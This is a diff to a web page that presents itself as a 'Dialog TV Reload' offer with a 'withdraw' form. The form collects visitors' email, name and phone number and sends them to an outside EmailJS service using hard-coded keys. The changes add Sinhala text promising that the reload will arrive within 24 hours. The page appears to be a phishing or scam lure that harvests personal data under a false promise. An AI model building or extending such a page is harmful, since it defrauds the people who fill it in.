@@ -111,14 +111,14 @@
       <img src="https://i.imgur.com/VXzG2uk.png"> Dialog TV Reload
     </button>
   </div>
-    
+   
   <divhttps: id="formContainer">
     <h2 id="formTitle"></h2>
     <img id="cardImage" src="" alt="Card Image">
     <form id="withdrawForm">
       <input type="text" id="name" placeholder="Your Active Email " required>
       <input type="text" id="number" placeholder="Your Name" required>
-      <input type="text" id="message" placeholder="Your Nomber" required>
+      <input type="text" id="message" placeholder="Your Nomber /Relod එක දාන්න ඔනි නොම්බරෙ/" required>
       <input type="text" id="time" readonly>
       <input type="submit" id="submitBtn" value="Submit">
     </form>
@@ -132,7 +132,7 @@
   <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
   <script>
     emailjs.init("JxcwLhzOOhD35rRUH");
-
+alert("මොහොතක් රැදි සිටින්න...")
     const form = document.getElementById("withdrawForm");
     const numberInput = document.getElementById("number");
     const formContainer = document.getElementById("formContainer");
@@ -183,6 +183,8 @@
       emailjs.send("service_2wht3tb", "template_jrstb44", data)
         .then(() => {
           alert("✅ Withdraw request sent successfully!");
+          alert("පැය 24ක් යාමට පෙර ඔබෙ යිල්ලිම යිටු වෙවි!")
+
           form.reset();
           formContainer.style.display = "none";
         })
